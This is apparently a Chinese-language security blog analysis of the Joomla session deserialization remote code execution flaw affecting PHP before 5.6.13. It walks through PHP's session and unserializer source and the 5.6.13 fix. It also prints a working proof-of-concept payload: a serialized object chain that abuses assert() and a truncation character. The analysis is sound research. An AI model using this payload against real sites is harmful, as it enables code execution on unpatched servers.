> 原文链接: https://www.anquanke.com//post/id/83120 


# session反序列化代码执行漏洞分析[Joomla RCE]


                                阅读量   
                                **271633**
                            
                        |
                        
                                                                                    



**[![](https://p5.ssl.qhimg.com/t01ea73f230e3dd0b34.png)](https://p5.ssl.qhimg.com/t01ea73f230e3dd0b34.png)**

**Author：L.N.@360adlab**



**0x01 漏洞影响版本**

PHP &lt; 5.6.13

**0x02 joomla利用程序分析**

joomla具体漏洞分析请看[phith0n牛分析文章](http://drops.wooyun.org/papers/11330)，本文只讨论此漏洞的核心问题所在。

**利用程序poc：**

```
`}`__test|O:21:"JDatabaseDriverMysqli":3:`{`s:2:"fc";O:17:"JSimplepieFactory":0:`{``}`s:21:"disconnectHandlers";a:1:`{`i:0;a:2:`{`i:0;O:9:"SimplePie":5:`{`s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:`{``}`s:8:"feed_url";s:37:"phpinfo();JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:`{``}``}`i:1;s:4:"init";`}``}`s:13:"connection";b:1;`}`ð���
```



注意poc中的ð���截断字符，此处是关键，当我们把此poc注入到数据库以后所形成的数据为：



```
__default|a:8:`{`s:15:"session.counter";i:1;s:19:"session.timer.start";i:1450174018;s:18:"session.timer.last";i:1450174018;s:17:"session.timer.now";i:1450174018;s:22:"session.client.browser";s:412:"`}`__test|O:21:"JDatabaseDriverMysqli":3:`{`s:2:"fc";O:17:"JSimplepieFactory":0:`{``}`s:21:"disconnectHandlers";a:1:`{`i:0;a:2:`{`i:0;O:9:"SimplePie":5:`{`s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:`{``}`s:8:"feed_url";s:37:"phpinfo();JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:`{``}``}`i:1;s:4:"init";`}``}`s:13:"connection";b:1;`}`
```

此时截断字符消失。

<br>

通过分析php底层实现代码：

[https://github.com/php/php-src/blob/PHP-5.4.5/ext/session/session.c](https://github.com/php/php-src/blob/PHP-5.4.5/ext/session/session.c)



```
#define PS_DELIMITER '|'
#define PS_UNDEF_MARKER '!'
PS_SERIALIZER_DECODE_FUNC(php) /* `{``{``{` */
`{`
const char *p, *q;
char *name;
const char *endptr = val + vallen;
zval *current;
int namelen;
int has_value;
php_unserialize_data_t var_hash;
PHP_VAR_UNSERIALIZE_INIT(var_hash);
p = val;
while (p &lt; endptr) `{`
zval **tmp;
q = p;
while (*q != PS_DELIMITER) `{`
if (++q &gt;= endptr) goto break_outer_loop;
`}`
if (p[0] == PS_UNDEF_MARKER) `{`
p++;
has_value = 0;
`}` else `{`
has_value = 1;
`}`
namelen = q - p;
name = estrndup(p, namelen);
q++;
if (zend_hash_find(&amp;EG(symbol_table), name, namelen + 1, (void **) &amp;tmp) == SUCCESS) `{`
if ((Z_TYPE_PP(tmp) == IS_ARRAY &amp;&amp; Z_ARRVAL_PP(tmp) == &amp;EG(symbol_table)) || *tmp == PS(http_session_vars)) `{`
goto skip;
`}`
`}`
if (has_value) `{`
ALLOC_INIT_ZVAL(current);
if (php_var_unserialize(&amp;current, (const unsigned char **) &amp;q, (const unsigned char *) endptr, &amp;var_hash TSRMLS_CC)) `{`
php_set_session_var(name, namelen, current, &amp;var_hash  TSRMLS_CC);
`}`
zval_ptr_dtor(&amp;current);
`}`
PS_ADD_VARL(name, namelen);
skip:
efree(name);
p = q;
`}`
break_outer_loop:
PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
return SUCCESS;
`}`
```



代码中通过指针移动判断"|"的位置，获取"|"前面部分为session键名，然后通过php_var_unserialize函数反序列化"|"后面部门，如果解析成功则把值写入session，如果解析失败则销毁当变量，然后继续移动指针判断"|",如果"|"存在，继续把"|"前数据作为变量，解析"|"后面的值。

结合joomla漏洞：



```
__default|a:8:`{`s:15:"session.counter";i:1;s:19:"session.timer.start";i:1450174018;s:18:"session.timer.last";i:1450174018;s:17:"session.timer.now";i:1450174018;s:22:"session.client.browser"
;s:412:"`}`__test|O:21:"JDatabaseDriverMysqli":3:`{`s:2:"fc";O:17:"JSimplepieFactory":0:`{``}`s:21:"disconnectHandlers";a:1:`{`i:0;a:2:`{`i:0;O:9:"SimplePie":5:`{`s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:`{``}`s:8:"feed_url";s:37:"phpinfo();JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:`{``}``}`i:1;s:4:"init";`}``}`s:13:"connection";b:1;`}`
```



当php解析此段数据的时候，首先获取到"|"前面的数据"__default"为session的键名，然后"|"后面的数据进入反序列化流程php_var_unserialize，反序列化流程的底层关键代码如下：

[https://github.com/php/php-src/blob/PHP-5.4.5/ext/standard/var_unserializer.c](https://github.com/php/php-src/blob/PHP-5.4.5/ext/standard/var_unserializer.c)



```
size_t len, maxlen;
char *str;
len = parse_uiv(start + 2);
maxlen = max - YYCURSOR;
if (maxlen &lt; len) `{`
*p = start + 2;
return 0;
`}`
```



指针依次移动反序列化数据，当解析到如下数据的时候：

······s:412:"`}`__test|O:21:"JData······

数据经过上面关键代码：

len = parse_uiv(start + 2);通过parase_uiv获取412这个值给len；

maxlen = max – YYCURSOR;获取当前指针以后数据的长度，YYCURSOR当前指针指向`}`，即获取的是`}`_test……的数据长度为408

少了4个字符，这少的4个字符为我们的截断字符。

这样，此时if判断成功，进入内部语句，使得反序列化失败返回0，而我们的指针p指向"4".



```
if (maxlen &lt; len) `{`
*p = start + 2;
return 0;
`}`
php_var_unserialize返回0，
if (php_var_unserialize(&amp;current, (const unsigned char **) &amp;q, (const unsigned char *) endptr, &amp;var_hash TSRMLS_CC)) `{`
php_set_session_var(name, namelen, current, &amp;var_hash  TSRMLS_CC);
`}`
zval_ptr_dtor(&amp;current);
efree(name);
p = q;
```



注销当前变量，p = q;进入下一个循环，继续寻找"|",由于我们的p目前指向的是"4",所以session键名为412:"`}`__test，"|"后面数据正常反序列化，

最后经过session反序列化joomla的poc后代码执行：



```
'412:"`}`__test' =&gt;object(JDatabaseDriverMysqli)[30]
      public 'name' =&gt; string 'mysqli' (length=6)protected 'nameQuote' =&gt; string '`' (length=1)protected 'nullDate' =&gt; string '0000-00-00 00:00:00' (length=19)private '_database' (JDatabaseDriver) =&gt; nullprotected 'connection' =&gt; boolean trueprotected 'count' =&gt; int 0protected 'cursor' =&gt; nullprotected 'debug' =&gt; boolean falseprotected 'limit' =&gt; int 0protected 'log' =&gt;array (size=0)emptyprotected 'timings' =&gt;array (size=0)emptyprotected 'callStacks' =&gt;array (size=0)emptyprotected 'offset' =&gt; int 0protected 'options' =&gt; nullprotected 'sql' =&gt; nullprotected 'tablePrefix' =&gt; nullprotected 'utf' =&gt; boolean trueprotected 'errorNum' =&gt; int 0protected 'errorMsg' =&gt; nullprotected 'transactionDepth' =&gt; int 0protected 'disconnectHandlers' =&gt;array (size=1)
          0 =&gt;array (size=2)
              ...
      public 'fc' =&gt;object(JSimplepieFactory)[31]
```



**0x03 php&gt;=5.6.13版本修复**

在php&gt;=5.6.13版本中修复此问题，5.6.13版本以前是第一个变量解析错误注销第一个变量，然后解析第二个变量，但是5.6.13以后如果第一个变量错误，直接销毁整个session。

[https://github.com/php/php-src/blob/PHP-5.6.13/ext/session/session.c](https://github.com/php/php-src/blob/PHP-5.6.13/ext/session/session.c)



```
ALLOC_INIT_ZVAL(current);
if (php_var_unserialize(&amp;current, (const unsigned char **) &amp;q, (const unsigned char *) endptr, &amp;var_hash TSRMLS_CC)) `{`
php_set_session_var(name, namelen, current, &amp;var_hash  TSRMLS_CC);
`}` else `{`
var_push_dtor_no_addref(&amp;var_hash, &amp;current);
efree(name);
PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
return FAILURE;
`}`
var_push_dtor_no_addref(&amp;var_hash, &amp;current);
```



感谢@ryat师傅的指导。

<br>



**另一篇技术分析:**

**[http://bobao.360.cn/learning/detail/2500.html](http://bobao.360.cn/learning/detail/2500.html)**


